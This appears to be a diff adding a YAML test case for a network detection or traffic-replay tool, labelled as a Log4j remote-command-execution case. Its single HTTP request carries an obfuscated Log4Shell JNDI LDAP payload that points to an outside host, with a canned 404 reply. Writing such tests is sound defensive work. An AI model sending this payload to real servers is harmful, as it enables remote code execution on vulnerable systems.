@@ -1,0 +1,37 @@
+info:
+  name: 远程命令执行用例
+  description: 测试用例
+http:
+  data:
+    - description: "log4j漏洞用例"
+      ip_pair:
+        src_ip: 22.33.44.55
+        src_port: RANDOM
+        dst_ip: 172.168.100.2
+        dst_port: 80  
+      request:
+        format: plain
+        req_data: |
+          POST /log/log.action HTTP/1.1
+          Accept: */*
+          Content-Length: 76
+          Content-Type: application/x-www-form-urlencoded
+          User-Agent: Mozilla/5.0 (iPad; CPU iPad OS 16_7_6 like Mac OS X) AppleWebKit/531.0 (KHTML, like Gecko) 
+
+          id=${jndi:${upper:L}d${lower:A}${upper:P}://baidu.com.net/index}
+      response:
+        format: plain
+        resp_data: |
+          HTTP/1.1 404 Not Found
+          Server: nginx/1.22.0
+          Date: Tue, 22 Apr 2025 06:08:01 GMT
+          Content-Type: text/html
+          Content-Length: 145
+          Connection: close
+
+          <html>
+          <head><title>404 Not Found</title></head>
+          <body>
+          <center><h1>404 Not Found</h1></center>
+          </body>
+          </html>
